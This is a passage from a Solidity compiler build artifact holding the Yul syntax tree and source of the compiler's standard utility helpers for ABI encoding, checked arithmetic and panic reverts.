																"src": "75:20:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "66:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "128:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nodeType": "YulIdentifier",
																	"src": "104:23:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "104:30:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "104:30:2"
														}
													]
												},
												"name": "abi_decode_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "34:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "42:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "50:5:2",
														"type": ""
													}
												],
												"src": "7:133:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "209:193:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "255:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "264:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "267:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "257:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "257:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "257:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "230:7:2"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "239:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "226:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "226:23:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "251:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "222:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "222:32:2"
															},
															"nodeType": "YulIf",
															"src": "219:2:2"
														},
														{
															"nodeType": "YulBlock",
															"src": "281:114:2",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "296:15:2",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "310:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "300:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "325:60:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "357:9:2"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "368:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "353:3:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "353:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "377:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "335:17:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "335:50:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "325:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "179:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "190:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "202:6:2",
														"type": ""
													}
												],
												"src": "146:256:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "467:50:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "484:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "504:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "489:14:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "489:21:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "477:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "477:34:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "477:34:2"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "455:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "462:3:2",
														"type": ""
													}
												],
												"src": "408:109:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "588:53:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "605:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "628:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "610:17:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "610:24:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "598:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "598:37:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "598:37:2"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "576:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "583:3:2",
														"type": ""
													}
												],
												"src": "523:118:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "739:118:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "749:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "761:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "772:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "757:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "757:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "749:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "823:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "836:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "847:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "832:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "832:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "785:37:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "785:65:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "785:65:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "711:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "723:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "734:4:2",
														"type": ""
													}
												],
												"src": "647:210:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "961:124:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "971:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "983:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "994:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "979:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "979:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "971:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1051:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1064:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1075:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1060:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1060:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1007:43:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1007:71:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1007:71:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "933:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "945:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "956:4:2",
														"type": ""
													}
												],
												"src": "863:222:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1133:143:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1143:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1166:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1148:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1148:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1143:1:2"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1177:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1200:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1182:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1182:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1177:1:2"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1224:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nodeType": "YulIdentifier",
																				"src": "1226:16:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1226:18:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1226:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1221:1:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1214:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1214:9:2"
															},
															"nodeType": "YulIf",
															"src": "1211:2:2"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1256:14:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1265:1:2"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1268:1:2"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nodeType": "YulIdentifier",
																	"src": "1261:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1261:9:2"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "1256:1:2"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "1122:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "1125:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "1131:1:2",
														"type": ""
													}
												],
												"src": "1091:185:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1327:146:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1337:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1360:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1342:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1342:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1337:1:2"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1371:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1394:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1376:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1376:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1371:1:2"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1418:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "1420:16:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1420:18:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1420:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1412:1:2"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1415:1:2"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "1409:2:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1409:8:2"
															},
															"nodeType": "YulIf",
															"src": "1406:2:2"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1450:17:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1462:1:2"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1465:1:2"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "1458:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1458:9:2"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "1450:4:2"
																}
															]
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "1313:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "1316:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "1322:4:2",
														"type": ""
													}
												],
												"src": "1282:191:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1521:48:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1531:32:2",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1556:5:2"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "1549:6:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1549:13:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1542:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1542:21:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1531:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1503:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1513:7:2",
														"type": ""
													}
												],
												"src": "1479:90:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1620:32:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1630:16:2",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "1641:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1630:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1602:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1612:7:2",
														"type": ""
													}
												],
												"src": "1575:77:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1701:190:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1711:33:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1738:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1720:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1720:24:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "1711:5:2"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1834:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "1836:16:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1836:18:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1836:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1759:5:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1766:66:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "eq",
																	"nodeType": "YulIdentifier",
																	"src": "1756:2:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1756:77:2"
															},
															"nodeType": "YulIf",
															"src": "1753:2:2"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1865:20:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1876:5:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1883:1:2",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1872:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1872:13:2"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nodeType": "YulIdentifier",
																	"src": "1865:3:2"
																}
															]
														}
													]
												},
												"name": "increment_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1687:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "ret",
														"nodeType": "YulTypedName",
														"src": "1697:3:2",
														"type": ""
													}
												],
												"src": "1658:233:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1925:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1942:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1945:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1935:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1935:88:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1935:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2039:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2042:4:2",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2032:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2032:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2032:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2063:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2066:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2056:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2056:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2056:15:2"
														}
													]
												},
												"name": "panic_error_0x11",
												"nodeType": "YulFunctionDefinition",
												"src": "1897:180:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2111:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2128:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2131:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2121:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2121:88:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2121:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2225:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2228:4:2",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2218:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2218:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2218:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2249:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2252:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2242:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2242:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2242:15:2"
														}
													]
												},
												"name": "panic_error_0x12",
												"nodeType": "YulFunctionDefinition",
												"src": "2083:180:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2309:76:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2363:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2372:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2375:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "2365:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2365:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2365:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "2332:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "2354:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nodeType": "YulIdentifier",
																					"src": "2339:14:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "2339:21:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "2329:2:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2329:32:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2322:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2322:40:2"
															},
															"nodeType": "YulIf",
															"src": "2319:2:2"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2302:5:2",
														"type": ""
													}
												],
												"src": "2269:116:2"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_bool(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function increment_t_uint256(value) -> ret {\n        value := cleanup_t_uint256(value)\n        if eq(value, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) { panic_error_0x11() }\n        ret := add(value, 1)\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
